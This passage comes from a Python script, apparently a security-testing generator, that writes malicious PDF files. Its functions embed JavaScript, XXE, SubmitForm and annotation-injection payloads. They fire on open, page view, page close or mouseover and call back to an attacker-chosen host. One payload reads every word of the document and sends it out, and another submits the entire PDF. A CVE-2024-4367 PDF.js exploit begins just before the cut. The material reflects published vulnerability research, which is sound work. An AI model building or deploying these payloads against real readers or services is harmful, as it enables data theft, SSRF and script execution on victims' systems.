<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<config><present><pdf>
    <interactive>1</interactive>
</pdf></present></config>
<template>
    <subform name="_">
        <pageSet/>
        <field id="Header Inject">
            <event activity="initialize">
                <script contentType='application/x-formcalc'>
                    Post("''' + host + '''/test15","header-inject-test","text/plain","utf-8","Content-Type: text/html&#x0d;&#x0a;X-Injected: true&#x0d;&#x0a;")
                </script>
            </event>
</field>
    </subform>
</template>
</xdp:xdp>
endstream
endobj
trailer <<
    /Root <<
        /AcroForm <<
            /Fields [<<
                /T (0)
                /Kids [<<
                    /Subtype /Widget
                    /Rect []
                    /T ()
                    /FT /Btn
                >>]
            >>]
            /XFA 1 0 R
        >>
        /Pages <<>>
    >>
>>''')

# GotoE action with javascript: URI for browser XSS
# When a PDF is loaded via <embed> or <object> tags, the GotoE action can execute
# javascript: URIs in the embedding page's security context
# Source: https://insert-script.blogspot.com/2015/05/pdf-mess-with-web.html
def create_malpdf16(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
<</Type/Catalog/Pages 2 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
xref
0 4
0000000000 65535 f
0000000015 00000 n
0000000060 00000 n
0000000111 00000 n
trailer
<</Size 4/Root 1 0 R>>
startxref
190
3 0 obj
<< /Type /Page
   /Contents 4 0 R

   /AA <<
	   /O <<
	      /F (javascript:new Image().src="''' + host + '''/test16")
		  /D [ 0 /Fit]
		  /S /GoToE
		  >>

	   >>

	   /Parent 2 0 R
	   /Resources <<
			/Font <<
				/F1 <<
					/Type /Font
					/Subtype /Type1
					/BaseFont /Helvetica
					>>
				  >>
				>>
>>
endobj


4 0 obj<< /Length 100>>
stream
BT
/TI_0 1 Tf
14 0 0 14 10.000 753.976 Tm
0.0 0.0 0.0 rg
(GotoE JS Test) Tj
ET
endstream
endobj


trailer
<<
	/Root 1 0 R
>>

%%EOF
''')

# XXE via XMLData.parse() in PDF JavaScript
# CVE-2014-8452 - Adobe Reader processes external XML entities via JavaScript XML functions
# Triggers external entity resolution causing a network callback
# Source: https://insert-script.blogspot.com/2014/12/multiple-pdf-vulnerabilites-text-and.html
def create_malpdf17(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.4
1 0 obj
<<>>
%endobj
trailer
<<
/Root
  <</Pages <<>>
  /OpenAction
      <<
      /S/JavaScript
      /JS(
      try {
          XMLData.parse('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "''' + host + '''/test17">]><root>&xxe;</root>', false, true);
      } catch(e) {}
      )
      >>
  >>
>>''')


# PortSwigger Research: Annotation URI Injection with JavaScript action
# Demonstrates injection via unescaped parentheses in annotation URI fields
# Exploits PDF-Lib and jsPDF which fail to escape parentheses
# Duplicate /A key in annotation dict - second (JavaScript) overrides first (URI)
# Source: https://portswigger.net/research/portable-data-exfiltration
def create_malpdf18(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Annots [<< /Type /Annot
                 /Subtype /Link
                 /Rect [0 0 595 842]
                 /A << /S /URI /URI (blah) >>
                 /A << /S /JavaScript /JS (app.openDoc({cPath: encodeURI("''' + host + '''/test18"), cFS: "CHTTP"})) /Type /Action >>
              >>]
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'annot-inject') Tj
  ET
endstream
endobj

xref
0 5
0000000000 65535 f
0000000010 00000 n
0000000069 00000 n
0000000170 00000 n
0000000850 00000 n
trailer
  << /Root 1 0 R
     /Size 5
  >>
startxref
970
%%EOF
''')


# PortSwigger Research: PV (Page Visible) auto-execution
# Screen annotation fires JavaScript automatically when page becomes visible
# No user interaction required - targets Acrobat Reader
# Source: https://portswigger.net/research/portable-data-exfiltration
def create_malpdf19(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Annots [<< /Type /Annot
                 /Subtype /Screen
                 /Rect [0 0 900 900]
                 /AA << /PV << /S /JavaScript /JS (app.openDoc({cPath: encodeURI("''' + host + '''/test19"), cFS: "CHTTP"})) >> >>
              >>]
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'pv-auto'     ) Tj
  ET
endstream
endobj

xref
0 5
0000000000 65535 f
0000000010 00000 n
0000000069 00000 n
0000000170 00000 n
0000000820 00000 n
trailer
  << /Root 1 0 R
     /Size 5
  >>
startxref
940
%%EOF
''')


# PortSwigger Research: PC (Page Close) triggered execution
# Annotation fires JavaScript when the page or document is closed
# No user interaction required - targets Acrobat Reader
# Source: https://portswigger.net/research/portable-data-exfiltration
def create_malpdf20(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Annots [<< /Type /Annot
                 /Subtype /Screen
                 /Rect [0 0 900 900]
                 /AA << /PC << /S /JavaScript /JS (app.openDoc({cPath: encodeURI("''' + host + '''/test20"), cFS: "CHTTP"})) >> >>
              >>]
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'pc-close'    ) Tj
  ET
endstream
endobj

xref
0 5
0000000000 65535 f
0000000010 00000 n
0000000069 00000 n
0000000170 00000 n
0000000820 00000 n
trailer
  << /Root 1 0 R
     /Size 5
  >>
startxref
940
%%EOF
''')


# PortSwigger Research: SubmitForm with SubmitPDF flag
# Sends the entire PDF document contents to the attacker server
# Uses Flags 256 (SubmitPDF) instead of Flags 4 (SubmitHTML)
# Source: https://portswigger.net/research/portable-data-exfiltration
def create_malpdf21(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
     /OpenAction 5 0 R
     /AcroForm << /Fields [<< /Type /Annot /Subtype /Widget /FT /Tx /T (a) /V (b) /Ff 0 >>] >>
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'submitpdf'   ) Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Action
     /S /SubmitForm
     /F << /Type /FileSpec /F (''' + host + '''/test21.pdf) /V true /FS /URL >>
     /Flags 256
  >>
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000187 00000 n
0000000288 00000 n
0000000553 00000 n
0000000673 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
900
%%EOF
''')


# PortSwigger Research: JavaScript submitForm() API
# Uses this.submitForm() to submit PDF contents via JavaScript
# Submits as PDF format using cSubmitAs parameter - targets Acrobat Reader
# Source: https://portswigger.net/research/portable-data-exfiltration
def create_malpdf22(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.4
1 0 obj
<<>>
%endobj
trailer
<<
/Root
  <</Pages <<>>
  /OpenAction
      <<
      /S/JavaScript
      /JS(
      this.submitForm({cURL: "''' + host + '''/test22", cSubmitAs: "PDF"});
      )
      >>
  >>
>>''')


# PortSwigger Research: Button Widget injection for Chrome/PDFium
# Invisible button widget covering entire page executes JavaScript on click
# Requires /AcroForm in catalog and Widget annotation with /FT /Btn
# Source: https://portswigger.net/research/portable-data-exfiltration
def create_malpdf23(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
     /AcroForm << /Fields [5 0 R] >>
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Annots [5 0 R]
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'widget-btn'  ) Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Annot
     /Subtype /Widget
     /Rect [0 0 900 700]
     /Parent << /FT /Btn /T (a) >>
     /A << /S /JavaScript /JS (app.openDoc({cPath: encodeURI("''' + host + '''/test23"), cFS: "CHTTP"})) >>
  >>
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000090 00000 n
0000000191 00000 n
0000000560 00000 n
0000000680 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
920
%%EOF
''')


# PortSwigger Research: Text Field Widget for blind SSRF
# Widget with text field type submits form data as POST body
# Enables blind SSRF attacks via PDF form field submission
# Source: https://portswigger.net/research/portable-data-exfiltration
def create_malpdf24(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
     /AcroForm << /Fields [5 0 R] >>
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Annots [5 0 R]
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'widget-tx'   ) Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Annot
     /Subtype /Widget
     /Rect [0 0 900 700]
     /Parent << /FT /Tx /T (foo) /V (bar) >>
     /A << /S /JavaScript /JS (this.submitForm("''' + host + '''/test24", false, false, ["foo"])) >>
  >>
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000090 00000 n
0000000191 00000 n
0000000560 00000 n
0000000680 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
930
%%EOF
''')


# PortSwigger Research: Content extraction via getPageNthWord()
# JavaScript reads all rendered text from the PDF and exfiltrates it
# Loops through all pages and words, sends data via network callback
# Source: https://portswigger.net/research/portable-data-exfiltration
def create_malpdf25(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
     /OpenAction 5 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 85 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (SECRET: The quick brown fox jumps) Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Action
     /S /JavaScript
     /JS (var w=[];for(var p=0;p<this.numPages;p++){for(var i=0;i<this.getPageNumWords(p);i++){w.push(this.getPageNthWord(p,i,true))}}app.openDoc({cPath:encodeURI("''' + host + '''/test25?d="+w.join("+")),cFS:"CHTTP"}))
  >>
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000080 00000 n
0000000181 00000 n
0000000450 00000 n
0000000590 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
950
%%EOF
''')


# PortSwigger Research: Mouseover trigger via E (mouse enter) entry
# Annotation fires JavaScript on mouseover without requiring a click
# Uses additional action dictionary with E entry - targets PDFium
# Source: https://portswigger.net/research/portable-data-exfiltration
def create_malpdf26(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Annots [<< /Type /Annot
                 /Subtype /Link
                 /Rect [0 0 900 900]
                 /AA << /E << /S /JavaScript /JS (app.openDoc({cPath: encodeURI("''' + host + '''/test26"), cFS: "CHTTP"})) >> >>
              >>]
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'mouseover'   ) Tj
  ET
endstream
endobj

xref
0 5
0000000000 65535 f
0000000010 00000 n
0000000069 00000 n
0000000170 00000 n
0000000810 00000 n
trailer
  << /Root 1 0 R
     /Size 5
  >>
startxref
930
%%EOF
''')


# PortSwigger Research: Hybrid Acrobat/Chrome payload
# Single PDF targets both Acrobat (via OpenAction JavaScript) and Chrome (via Widget button)
# Uses distinct callback paths to identify which viewer triggered
# Source: https://portswigger.net/research/portable-data-exfiltration
def create_malpdf27(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
     /OpenAction 5 0 R
     /AcroForm << /Fields [6 0 R] >>
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Annots [6 0 R]
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'hybrid'      ) Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Action
     /S /JavaScript
     /JS (app.openDoc({cPath: encodeURI("''' + host + '''/test27-acrobat"), cFS: "CHTTP"}))
  >>
endobj

6 0 obj
  << /Type /Annot
     /Subtype /Widget
     /Rect [0 0 900 700]
     /Parent << /FT /Btn /T (a) >>
     /A << /S /JavaScript /JS (app.openDoc({cPath: encodeURI("''' + host + '''/test27-chrome"), cFS: "CHTTP"})) >>
  >>
endobj

xref
0 7
0000000000 65535 f
0000000010 00000 n
0000000100 00000 n
0000000201 00000 n
0000000570 00000 n
0000000690 00000 n
0000000870 00000 n
trailer
  << /Root 1 0 R
     /Size 7
  >>
startxref
1120
%%EOF
''')


# PortSwigger Research: URL hijacking in annotations
# Injection via unescaped parentheses redirects annotation clicks to attacker URL
# Duplicate /A key - second (attacker URI) overrides first (original URI)
# Exploits PDF-Lib and jsPDF which fail to escape parentheses
# Source: https://portswigger.net/research/portable-data-exfiltration
def create_malpdf28(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Annots [<< /Type /Annot
                 /Subtype /Link
                 /Rect [0 0 595 842]
                 /A << /S /URI /URI (blah) >>
                 /A << /S /URI /URI (''' + host + '''/test28) /Type /Action >>
                 /F 0
              >>]
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'uri-hijack'  ) Tj
  ET
endstream
endobj

xref
0 5
0000000000 65535 f
0000000010 00000 n
0000000069 00000 n
0000000170 00000 n
0000000790 00000 n
trailer
  << /Root 1 0 R
     /Size 5
  >>
startxref
910
%%EOF
''')



# CVE-2024-4367: Arbitrary JavaScript execution in PDF.js via font FontMatrix injection
# Affects PDF.js v0.8.1181 through v4.1.392 (Firefox < 126, web/Electron apps using PDF.js)
# The FontMatrix array in Type1 font dicts is inserted unsanitized into new Function() calls
# A string value in FontMatrix breaks out of c.transform() to execute arbitrary JavaScript
# Fixed in PDF.js v4.2.67
# Source: https://codeanlabs.com/2024/05/cve-2024-4367-arbitrary-js-execution-in-pdf-js/
# PoC: https://github.com/codean-labs/pocs/tree/main/CVE-2024-4367%20(PDF.js)
_CMBX12_FONT_B64 = (
    "LHA/KWAvTzxvY0BWJiNJREtJSGIvaGY9LzZWVG1MMGVzayowSmI9ODBKV3RdLHVlVCNDaDVYTTZW"
    "VG1MMGVzKF48YjY7bUJsQGxNKz4+SyovaGV0NyQ3LXVjRWIvWyRCbEBsV0A8PydBK0FIY2wrQS1j"
    "bSs+R1lwMGZEJ0kyYGBXSCs+UFcpMz03Jlk2WlFhSEZEbDFcK0BLWF1Cay8+XC9nKmMpRElta3Is"
    "c3VUaUgjZFYzQlFROVg2WjZwaEViVDAiRjxEdUEuM0w/KjNCJkszMSwoQ0IrQDBqVUViVCNsREJN"
    "WV5GRCw2JkA8PzNuQDtJJmJEZSFLbUZFbjM+Nlo2cGhFYlQwIkY/MU5tNEQ4aFlFJm9YKkdCXDZg"
    "QDtVJzxEZlRKUy40Y1RjQmxuIzI7SXNvXEVjdSMpK0BeOWVGPEY9ZUQuT2hXOWdWcjoxK2luWytC"
    "MyNnRiEqcWpES0kiIkRlPSo4QDwscCVCbGJENUJrKF5sRihKbClGYChgJEVaZkk7QUtYb0M5SFss"
    "TUFTclZbRGYwWT45UEohSkRLQkE/K0JFJm9GKG9RMSs+R0snL2RgbUk8K291ZStEYmIlQVN1UiMr"
    "REdtPkJsNSY4Qk9yO3BAcTBGb0UrKlgwQmw3UStBbmMnbStBWUkjL3ApPlsvMEpBPUEwPlQtK0NU"
    "KS1EW0lkNUA8USduQ2dnZGhBS1oyMkZEKWUqK0BcWG8rQ1RAUStEPms9RSZvWCpGKDk2KUUtLS5S"
    "RihvR0NEZlRKRDpJXCMxJDctdWVESWMrUUQvRWolRkU3ZFlEZjBZYkJsW2NwRkRsMkYwMS9IIz0+"
    "O1FSQ01uJzdETDQkKDlnVnI6MSpDMUNESWQ/dERLSSIzRmA5ITZESj0qNUFQIzk0Q01uJzdETDVv"
    "OkUhZTZ1REo9KjVBUCM5NEI0WjAtMikkXjwyYDxaPUFUOGkoR1trRD83VzMwZDwtYEZvK0Q1OC0r"
    "PkchTUU/SlwtQTo4ZkREZj9oMkA7TCFySTsqOylDaWEucEhaTlY9QUtaKThGXyx1SkFtb0xzQVVT"
    "OSlBU2NGIUk9I1I3Q2lhMDlCa0NwbUYoR1w1MGQoIkBAcnJpJkFTNV5wJDg0a2VES0pqJ0UrTC5Q"
    "Mz9WakRBZFRoOzdXMzBkOWpyLWFCbTpiKTBkJjRvMUVcTHMyJz8qXT8hU1JuQVJUK2ZESlhTQEE3"
    "XT9bMDFLa3RGQT83XUFLV1gpOi4lclo3azZyJDY8R3J0K0NvJXEkODRrZURLSjMzRGczQ08vTiM9"
    "LC9NXTE8Kz5HVCwzP1U3PDBIYmRhQVJUK2ZESlhTQEE3XT9bMDMpbihFSFBoYTZtKz9AMEpHRkQz"
    "P1ZqREFkVTFmQDswViQ8LWBGbys+PXBLQVMpOSY3VzMwZDhUJi1ZKz86UVRCayk2LUE5RGk2QFYn"
    "MWREQC8lP0FURGorRGYtW0cwSkc6ODBKRzcyK0VEJSVBOGNAJUdwJFgvQWRVMWREZmZdJ0FLV0Jn"
    "RGZCdUJCa00rJCtDJFRYME9uP0EyKS00LjNCOSNMKz5QVykzP1VWKUFUREtwQDtbMl5APD8wb0Qu"
    "Lk8jQHBzMHI7Zj8vW0FUVzI/PlZKI2g0RDhoWUUmb1gqR0JcNmBAO1UnPERmVEpTPlZKI2kvMEsu"
    "TkZEKWRwQVRNRidHJUcyLDdXMzBkK0FRP15BS1g/NzY8R3J0L2glb2BBUlQrZkRKWFNAQTddP1sw"
    "MUwpI0NlZURVQUtXQmc5Z1ZyOjErPT5kQVJUK2ZESlhTQEE3XT9bMDFLQWVCbCYmaUA7VFF1LXBx"
    "b2lFLTY4NkVaZShwQTddZSEuM05ZQkA6WDpvQ2pALjZBUyk5Jj0oUSlZQlFQQEY2PnBbTi4zTllC"
    "QDpYOm9DakAuNkFTKTkmOFRcQldCaydHSEI1RC0lMEhhbjtBZFUyKkYlMGtnQVJuVk9GQ1N1LEFt"
    "b0xzQUtZTXBBZFUxa0RJZD0hQ2hbY3U6aUNEaEZENVoyKz4jPCUwSGFuO0FkVTFrRElkPSFDaFtj"
    "dTwrb3VVQ01tXilGISo9bytDbyVxJD4iKmMrRUQlJUE4Y0AlR3AkWC9BZFUxW0RJW1RxQmw3USsx"
    "LFVzNEA8LUJzR21aNUowZCY1LzInQDYjK0RHXyhBVSM+L0dba0QwMC5xLVxGQ1xycCtFMklGSTM8"
    "LT9FWEg/IkUkLiVyKz42IydFLTY3MEE5RGk2MkR1WzI2Nkw1aUY6KVEkRSQuJXQrPjYpKUUtNjcw"
    "QTlEaTYyRTJnNDZtLUdrRjopUSRFJC4mISs+Ni8rRS02NzBBOURpNjJfWkAtN05jWW1GOilRJEUk"
    "LihvKz42NS1FLTY3MEE5RGk2Ml9sTC84MERrb0Y6KVEkRSQuKHErPjY7L0UtNjcwQTlEaTYyYDtk"
    "MzlIXDpzRjopUSRFJC4odSs+NkczRS02NzBBOURpNjJgVyE2OkVYViFGOilRJEUkLitvKz42UDZF"
    "LTY3MEE5RGk2MyYyVTA7QlRxJEY6KVEkRSQuK3IrPjZZOUUtNjcwQTlEaTYzJkRhMjwkNi4mRjop"
    "USRFJC4rdCs+Nl87RS02NzBBOURpNjMmVm00PFpsQChGOilRJEUkLiwhKz42ZT1FLTY3MEE5RGk2"
    "M0E7Ui89cy5kLEY6KVEkRSQuLyIrPjcuR0UtNjcwQTlEaTYzQi8tN0BOXVc0RjopUSRFJC4vJCs+"
    "NzRJRS02NzBBOURpNjFjLT0uQHJINCRAM0JOM0Y6KVEkRSQta2gwSGAjWitFMklGJD1uOXUrPkdR"
    "KSs+NzpLRS02NzBBOURpNjIpWlIxQVNHZGpGPEdPRkY6KVEkRSQta2gxKkE1XitFMklGJD1uOXUr"
    "PkdTbjA0bmY9RS02NzBBOURpNjBmMSIrQW5HYSJFLTY3MEE5RGk2MGVzaylBbmBCLEZgW3QkRmA4"
    "SFwxRVw+X0JtKyYxRS02NzBBOURpNjBmJ3EqQW8mVC9GYFt0JEZgOEhcMSpBNV5EZnAoQ0UtNjcw"
    "QTlEaTYwZWJDKzA0dURIRmBbdCRGYDhIWDBKam4qQkhWODpGOilRJEUkLXRwKz43RFJFK2lnIytF"
    "MklGJD1uOXUrPkdRLSs+N0ZPRS02NzBBOURpNjBlYkwuMDU7VktGYFt0JEZgOEhYMEsxKy1DRVJT"
    "PUY6KVEkRSQta2gzJDlraitFMklGJD1uOXUrPkdRMSs+N1JTRS02NzBBOURpNjBla0ApMDVfbk9G"
    "YFt0JEZgOEhcMl1zYmtCbDdLKUUtNjcwQTlEaTYwZWtDKjA1aHRQRmBbdCRGYDhIWzM/VHRuRElq"
    "cjBGYFt0JEZgOEhYMGVzaylFJDArQkY6KVEkRSQtdGsrPjdcQkViMC0pQVMtJCxFLTY3MEE5RGk2"
    "MWJnKytFKypjdURLOUgoQlFQQTlGYFt0JEZgOEhbMkJYWWxBVERMJ0EwPmk2RjopUSRFJC1raTFF"
    "XD5qK0UySUYkPW45dSs+dSJ1MDYpLEdGKiksN0RCTm5ARjopUSRFJC4ucis+N19XRGZmUSRAVmZq"
    "bEFvby83RmBbdCRGYDhIWjFhIkdrRmAyQTVBN0JAcUJrTSskK0UySUYkPW45dSs+R1QtKz43YVhF"
    "LTY3MEE5RGk2MGVrTy4wNjg3VEZgW3QkRmA4SFwyJz1QbkFUaFgmK0UySUYkPW45dSs+a3R1MDY6"
    "aVArRTJJRiQ9bjl1Kz5jIyIwNjpyPEYoY1w4RmBbdCRGYDhIWDBmQy4tRjxHT0ZGOilRJEUkLiJt"
    "Kz43aE1FYi9mKUUtNjcwQTlEaTYyKSQuK0ZFX1hHRS02NzBBOURpNjBla1UwMDZKQ1ZGYFt0JEZg"
    "OEhYMGZVOi9GcyhhSEY6KVEkRSQta2kzP1R1IStFMklGJD1uOXUrPkdXKis+N3NeRS02NzBBOURp"
    "NjBldEkrMDZuW1pGYFt0JEZgOEhYMSw5dCpINkAwTEY6KVEkRSQtdHMrPjglUEVjMyg+RmBbdDJB"
    "UlQrZkRKWFNAQTddP1tAcylnNEFTdVUjQmspNi1BU3UjY0BzKWc0QVN1VSVCbCU/J0FTJCp0QGde"
    "bz9EZHRrXkM5aU4qcG9tJSdHOmhxJTRqdF89PS10RWdIZUVHUUZudVJRUHBybyxLJjpWQjYnXVIv"
    "JkRaOzcuLm9qWis4cFFQXFsyVHNccyQiJ3FnQTxLT10nVGddKmQzOyg8NFtybFRxa3IqPTNdOzwn"
    "XVNuckdkM2NKU1BAdSFQXzVRVFEsKjYlVCZsNXBpallIR2RHQWhnV1lFJ2pcYjBEMkc0R1VXbVdK"
    "WTxLKDE2VnBtI2RAXCkkZCtwTi1AKj0rLC1uOT5KbnAlSGlJVD9tTlo4cyhWMklJKXFMVjBjRCgx"
    "NjIxXEhKUFolMTM6NUssVDBjJio8WXNJYmdAYmE2S2pfLShZPSM0Vk40PyhNbCgpLD9JbFNMXWFu"
    "T2sxcEo0PWZmWjpYY2YqJWFsIUshL1dYbi47TDYjaEFpWyRxNWwiajpqXikuS1VaVCJmMXJAcVpT"
    "JD9LKFlrUFowQk1sa0whRWU/VHJDTlNyPzE1RDo4UCYpMW1vZEUkL14/Q0A5UUllJUkpNT4taTNJ"
    "XUMoWyQoSD01YHNcU0BcSW1KXzBdVTglSUxrMjJ1KW9rY2QsKyEjYkc4bTwqQVRQPDZ0VWJhV2s2"
    "OjBrX2AmM3NLKltTbGEiUVhxTGJNNG9sViVOUjdmI0M8V3M/OSMjWl5zMi5VJ2xYUFEzZzBRbyhx"
    "KjU+aWk3RHNKamBRNy9BPyZqRmQ+aloxM19JNSsiTnNJOE1CYWxUVTlJamRsYyNEXUBNMW9MWEEm"
    "X0lEaFBEVFlHYmw8VW0/azMtUTlMTUJDcityOmBWVUJbKmJsJExeV0hYWTxsY19JKmtOY2QtY1RZ"
    "Pz9fMyImJER0WkFLc1QybWtMQjYxS1RkOF5ralxmZC4+IkUvZiRAc1kxK0lTUXJGcXRhbTo0WjUo"
    "bXFuLWxLKl1LI1xVdFE0MmMqLEZebSs+JihuSUJWTlZWLyFzPzlHSF8mOmlzUF5rLGBxKilkLEo8"
    "aD0mKEE4VidvQm0+amtHTWpyQyYtX1JNQjYlTCg/SjVPclZ0JjlHW2U5bmxLUnBTblY4TmQ1NThI"
    "KVRdUV5MSCs1YywzcExGV0dGXWBxRTZnYUgzVyRGYFElXjlLZE4zV0ssTVxkYD1pJWZxSCFuOnQx"
    "RDBWZ1REa1wvdG1pXnNpX1AvWj9zQDxAWjhKKl0nblxJZU1lbVYwPGAuSEtBIWIhbkdCdF0scU82"
    "aVFYIT5kMXAvOVx1SE9ARnI2UkcpQ1YmKyZqMD5bTURqK1UyK3VdUlJeMyVELnNoKyo4JWtUTSFA"
    "Ymc2RWBvSy1NRTlAbSdaampaIT5cITJXTSk3QjxuMmQiImtNZS49OSNoIztJJ2E+UzJuTGs+JEBD"
    "OUQxI2gwRGhObk5PRmJOKjhSLStlOiZwI3RET0hhU2ptPEtNVEddRmcpPyIvQCUlRDg/ZlteMWpd"
    "UmBrc3MqYjctaDlHPklTI3NJOiE8WUNhS0lGdGpnPydLLlFiZDo9Sys3YDNWLjNTbksxKSpJcj5E"
    "T24hSkFQaztUOitpJiNiL21jNGNvVGA3YFNSUmYiRk1uLlYhL2Nsc0xjby9YLjk7QlMrXT40UipA"
    "U0Q5MzMvKmhMbUtjIWhxPkZFVj8pP3QmZC9cV15sajFzUzBWQSg8L1BaQzFVL1soSlZZKm1kQGcu"
    "UmBOW0JDIyxVOkBZKklUMUlhVj08JjNsYSY7XE9mVGAlSkswLElSakwnTlVrQGg2TjlULUdeVnBG"
    "LzRoPC9lV2BEUypBKixTZDFVLCU/YSNJa1IkWVxtNiJtbE0xXStzS3BEP3U/XUBASDtjSyIoR0te"
